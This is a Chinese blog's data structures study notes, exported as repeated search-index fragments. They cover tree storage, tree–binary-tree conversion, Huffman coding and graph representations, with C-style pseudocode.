在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#哈夫曼树"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#哈夫曼树构造过程"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#哈夫曼编码"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#文件的编码和解码"},{"categories":["notice"],"content":"\r0x6图","date":"2023-12-19","objectID":"/data_structure_notes/:6:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x6图"},{"categories":["notice"],"content":"\r图的定义和术语图：Graph=(V,E) V：顶点(数据元素)的有穷非空集合； E：边的有穷集合。 **无向图：**每条边都是无方向的 **有向图：**每条边都是有方向的 **完全图：**任意两个点都有一条边相连 **稀疏图：**有很少边或弧的图。 **稠密图：**有较多边或弧的图。 **网：**边/弧带权的图。 **邻接：**有边/弧相连的两个顶点之间的关系。 存在(vi, vj)，则称vi和vj互为邻接点； 存在\u003cvi, vj\u003e，则称vi邻接到vj， vj邻接于vi **关联(依附)：**边/弧与顶点之间的关系。 存在(vi, vj)/ \u003cvi, vj\u003e， 则称该边/弧关联于vi和vj **顶点的度：**与该顶点相关联的边的数目，记为TD(v) 在有向图中, 顶点的度等于该顶点的入度与出度之和。顶点 v 的入度是以 v 为终点的有向边的条数, 记作 ID(v) 顶点 v 的出度是以 v 为始点的有向边的条数, 记作OD(v) **路径：**接续的边构成的顶点序列。 **路径长度：**路径上边或弧的数目/权值之和。 **回路(环)：**第一个顶点和最后一个顶点相同的路径。 **简单路径：**除路径起点和终点可以相同外，其余顶点均不相同的路径。 **简单回路(简单环)：**除路径起点和终点相同外，其余顶点均不相同的路径。 连通图（强连通图） 在无（有）向图G=( V, {E} )中，若对任何两个顶点 v、u 都存在从v 到 u 的路径，则称G是连通图（强连通图）。 权与网 图中边或弧所具有的相关数称为权。表明从一个顶点到另一个顶点的距离或耗费。带权的图称为网。 子图 设有两个图G=（V，{E}）、G1=（V1，{E1}），若V1属于V，E1属于 E，则称 G1是G的子图。例:(b)、(c) 是 (a) 的子图 连通分量（强连通分量） 无向图G 的极大连通子图称为G的连通分量。 极大连通子图意思是：该子图是 G 连通子图，将G 的任何不在该子图中的顶点加入，子图不再连通。 有向图G 的极大强连通子图称为G的强连通分量。 极大强连通子图意思是：该子图是G的强连通子图，将D的任何不在该子图中的顶点加入，子图不再是强连通的。 **极小连通子图：**该子图是G 的连通子图，在该子图中删除任何一条边，子图不再连通。 **生成树：**包含无向图G 所有顶点的极小连通子图。 **生成森林：**对非连通图，由各个连通分量的生成树的集合。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#图的定义和术语"},{"categories":["notice"],"content":"\r图的类型定义图的抽象数据类型定义： ","date":"2023-12-19","objectID":"/data_structure_notes/:6:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#图的类型定义"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003cG.vexnum; ++i) cin\u003e\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i\u003cG.vexnum;++i) //初始化邻接矩阵，边的权值均置为极大值 for(j = 0; j\u003cG.vexnum;++j) G.arcs[i][j] = MaxInt; for(k = 0; k\u003cG.arcnum;++k){ //构造邻接矩阵 cin\u003e\u003ev1\u003e\u003ev2\u003e\u003ew; //输入一条边依附的顶点及权值 i = LocateVex(G, v1); j = LocateVex(G, v2); //确定v1和v2在G中的位置 G.arcs[i][j] = w; //边\u003cv1, v2\u003e的权值置为w G.arcs[j][i] = G.arcs[i][j]; //置\u003cv1, v2\u003e的对称边\u003cv2, v1\u003e的权值为w }//for return OK; }//CreateUDN 补充算法：在图中查找顶点 int LocateVex(AMGraph G,VertexType u){ //图G中查找顶点u，存在则返回顶点表中的下标；否则返回-1 int i; for(i=0;i\u003cG.vexnum;++i) if(u==G.vexs[i]) return i; return -1; } 创建无向图和有向网\r邻接矩阵特点**优点：**容易实现图的操作，如：求某顶点的度、判断顶点之间是否有边、找顶点的邻接点等等。 **缺点：**n个顶点需要n*n个单元存储边;空间效率为O(n2)。 对稀疏图而言尤其浪费空间。 邻接表（链式）\r**顶点：**按编号顺序将顶点数据存储在一维数组中 **关联统一顶点的边（以顶点为尾的弧）：**用线性链表存储 无向图的表示方式 特点： 邻接表不唯一 若无向图中由n个顶点、e条边、则其邻接表需要n个头结点和2e个表结点。适合存储稀疏图。 无向图中顶点vi的度为第i个单链表中的结点数。 有向图的表示方式 邻接表特点： 顶点vi的出度为第i个单链表中的结点个数 顶点vi的入度为则很难哥哥但李娜表中邻接点域值是i-1的结点个数 逆邻接表特点： 顶点vi的入度为第i个单链表中的结点个数 顶点vi的出度为整个单链表中邻接点域值是i-1的结点个数 顶点的结点结构 typedef struct VNode{ VerTexType data; ArcNode *firstarc; }VNode,AdjList[MVNum] 弧（边）的结点结构 #define MVNum 100 //最大顶点数 typedef struct AceNode{ //边结点 int adjvex; //该边所指向的顶点的位置 struct ArcNode *nextarc; //指向下一条边的指针 OtherInfo info; //和边相关的信息 }Arcnode; 图的结构 typedef struct{ AdjList vertices; int vexnum,arcnum; }ALGraph; 邻接表储存表示\r创建无向图 输入总顶点数和总边数 建立顶点表，依次输入点的信息存入顶点表中，是每个表头结点的指针域初始化为NULL 创建邻接表，依次输入每条边依附的两个顶点，确定两个顶点的序号i和j，建立边结点，将此边结点分别插入到vi和vj对应的两个边链表的头部 Status CreateUDG(ALGraph \u0026G){ //采用邻接表表示法，创建无向图G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003cG.vexnum; ++i){ //输入各点，构造表头结点表 cin\u003e\u003e G.vertices[i].data; //输入顶点值 G.vertices[i].firstarc=NULL; //初始化表头结点的指针域为NULL }//for for(k = 0; k\u003cG.arcnum;++k){ //输入各边，构造邻接表 cin\u003e\u003ev1\u003e\u003ev2; //输入一条边依附的两个顶点 i = LocateVex(G, v1); j = LocateVex(G, v2); p1=new ArcNode; //生成一个新的边结点*p1 p1-\u003eadjvex=j; //邻接点序号为j p1-\u003enextarc= G.vertices[i].firstarc; G.vertices[i].firstarc=p1; //将新结点*p1插入顶点vi的边表头部 p2=new ArcNode; //生成另一个对称的新的边结点*p2 p2-\u003eadjvex=i; //邻接点序号为i p2-\u003enextarc= G.vertices[j].firstarc; G.vertices[j].firstarc=p2; //将新结点*p2插入顶点vj的边表头部 }//for return OK; }//CreateUDG 邻接表特点 方便找任一顶点的所有“邻接点” 节约稀疏图的空间，需要N个头指针+2E个结点（每个结点至少两个域） 对于无向图，方便计算任一顶点的”度“ 对于有向图，之恩那个计算“出度”，需要构造”逆邻接表“来方便计算”出度“ 不方便检查任意一堆顶点间是否存在边 邻接矩阵和邻接表的关系\r联系邻接表中的每个链表对应于邻接矩阵中的一行，链表中结点个数等于一行中非零元素的个数。 区别①对于任一确定的无向图，邻接矩阵是唯一的（行列号于顶点编号一致），但邻接表不唯一（链接次序于顶点编号无关）。 ②邻接矩阵的空间复杂度为O(n^2)，而邻接表的空间复杂度为O(n+e). 用途邻接矩阵多用于稠密图 邻接表多用于稀疏图 十字链表Orthogonal List 